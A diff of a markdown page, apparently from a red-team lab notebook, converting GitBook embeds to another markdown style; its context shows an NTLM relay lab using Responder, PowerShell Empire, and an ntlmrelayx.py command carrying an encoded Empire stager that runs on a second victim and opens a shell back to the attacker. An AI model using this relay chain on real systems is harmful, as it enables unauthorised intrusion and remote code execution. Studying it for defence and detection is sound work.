@@ -14,7 +14,7 @@ Below steps are all done on the attacking system.
 
 One of the tools we will be using is Responder. Switch off SMB and HTTP listeners in responder's config file like so:
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-28 00-12-51.png>)
+![[Screenshot from 2018-10-28 00-12-51.png]]
 
 Start the Responder:
 
@@ -24,7 +24,7 @@ responder -I eth1 -v
 
 Configure a Powershell Empire `http` listener:
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-28 00-14-26.png>)
+![[Screenshot from 2018-10-28 00-14-26.png]]
 
 Generate an Empire stager for the `http` listener:
 
@@ -32,7 +32,7 @@ Generate an Empire stager for the `http` listener:
 launcher powershell http
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-28 00-15-18.png>)
+![[Screenshot from 2018-10-28 00-15-18.png]]
 
 Start a relay server:
 
@@ -42,9 +42,8 @@ ntlmrelayx.py -t 10.0.0.2 -c 'powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVg
 
 nltmrelay.py will be listening for any relayed NetNTLMv2 hashes and will forward them to a victim2 system (-t 10.0.0.2). On successful authentication, a command (specified with -c powershell... - which is our Empire stager) will be exeucted on victim2.&#x20;
 
-{% hint style="warning" %}
-Note that the NetNTLMv2 hashes cannot be relayed to the same host they are originating from. You can, however, try cracking them offline and use them on the machine they originated from.
-{% endhint %}
+> [!WARNING]
+> Note that the NetNTLMv2 hashes cannot be relayed to the same host they are originating from. You can, however, try cracking them offline and use them on the machine they originated from.
 
 Below shows the entire attack in an animated gif:
 
@@ -53,28 +52,28 @@ Below shows the entire attack in an animated gif:
 * attacker relays the authentication request to victim2
 * authentication succeeds and empire agent comes back to the attacker from victim2
 
-![](<../../.gitbook/assets/Peek 2018-10-28 00-26.gif>)
+![[Peek 2018-10-28 00-26.gif]]
 
 ## Observations
 
 Inspecting the traffic that was generated during this lab, it can be observed that once victim1 (10.0.0.7) gives away their hashes to the attacker (10.0.0.5) in packet #25, the authentication hashes are immediately relayed to the victim2 (10.0.0.2) system via SMB as seen in packet #26:
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-28 12-26-34.png>)
+![[Screenshot from 2018-10-28 12-26-34.png]]
 
 A quick look into the first HTTP stream of this attack and we can see the NTLM authentication handshake taking place. Highlighted in green (base64 encoded binary data in http stream), the console, and a packet selected in Wireshark show the last step of the handshake where victim1 is sending its host name, its domain with user name and the challenge response to the server (attacker) - which is the data that gets relayed eventually in the packet #26 as discussed above:
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-28 12-44-49.png>)
+![[Screenshot from 2018-10-28 12-44-49.png]]
 
 Once the attacker successfully authenticates to the victim2 via SMB, a new service with our malicious payload is created remotely on the victim2 and executed. This is when we get our Empire stager executed and receive the shell back.
 
-{% file src="../../.gitbook/assets/relay-attack.pcapng" %}
+
 NTLM Relaying with Empire Shells
-{% endfile %}
+
 
 ## References
 
-{% embed url="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html" %}
+[byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
 
-{% embed url="https://blogs.msdn.microsoft.com/chiranth/2013/09/20/ntlm-want-to-know-how-it-works/" %}
+[blogs.msdn.microsoft.com/chiranth/2013/09/20/ntlm-want-to-know-how-it-works](https://blogs.msdn.microsoft.com/chiranth/2013/09/20/ntlm-want-to-know-how-it-works/)
 
-{% embed url="https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python" %}
+[pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python](https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python)
